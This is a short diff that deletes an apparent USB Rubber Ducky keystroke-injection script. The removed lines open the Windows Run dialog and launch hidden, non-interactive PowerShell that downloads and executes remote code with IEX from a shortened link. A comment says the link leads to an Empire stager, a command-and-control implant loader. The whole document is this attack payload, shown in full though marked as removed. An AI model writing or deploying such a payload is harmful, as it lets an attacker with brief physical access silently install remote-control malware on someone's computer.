@@ -1,7 +1,0 @@
-GUI r
-DELAY 500
-STRING powershell -w 1 -nop -noni -c "IEX (iwr 'https://goo.gl/XXXXXXX')"
-ENTER
-
-
-REM Where https://goo.gl/XXXXXXX forwards to a raw version of a GIST containing an Empire Stager
